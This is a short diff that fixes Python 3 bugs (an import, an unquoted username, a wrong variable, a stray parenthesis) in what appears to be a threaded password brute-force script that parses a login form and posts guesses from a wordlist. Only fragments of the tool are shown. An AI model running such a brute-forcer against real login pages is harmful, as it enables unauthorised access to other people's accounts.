@@ -5,11 +5,11 @@ import sys
 import queue
 import http.cookiejar
 
-from HTMLParser import HTMLParser
+from html.parser import HTMLParser
 
 
 user_thread = 10
-username = admin
+username = 'admin'
 wordlist_file = '/home/wsrtk/Downloads/all.txt'
 resume = None
 
@@ -45,7 +45,7 @@ class BruteParser(HTMLParser):
                     tag_value = value
 
             if tag_name is not None:
-                self.tag_results[tag_name] = value
+                self.tag_results[tag_name] = tag_value
 
 
 class Bruter(object):
@@ -90,7 +90,7 @@ class Bruter(object):
 
             login_data = urllib.parse.urlencode(post_tags)
 
-            login_response = opener.open(target_post, login_data))
+            login_response = opener.open(target_post, login_data)
 
             login_result = login_response.read()
 
